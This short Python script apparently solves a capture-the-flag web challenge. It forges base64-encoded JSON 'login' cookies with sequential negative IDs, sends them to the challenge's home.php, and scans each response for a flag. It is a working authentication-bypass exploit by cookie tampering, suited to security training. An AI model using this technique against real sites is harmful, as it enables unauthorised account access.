import requests
import base64
import random
import re

usrname = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
passwd = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
print(f'Using username: {usrname} and password: {passwd}')
conferma = passwd
urlbase = 'http://sn4ck-sh3nan1gans.challs.olicyber.it/'
s = requests.Session()
k=146
for i in range(0, -1000, -1):
    id_str = '{"ID":' + str(i) + '}'
    base64_id = base64.b64encode(id_str.encode('utf-8')).decode('ascii')
    s.cookies.update({"login": base64_id})
    r=s.get(urlbase + 'home.php')
    html = r.text
    m = re.search(r"flag\{.*?\}", html, re.IGNORECASE)
    if m:
        print("Trovata flag:", m.group(0))
        break
    else:
        print("Nessuna flag trovata nella sorgente HTML")
   

    
#105 flag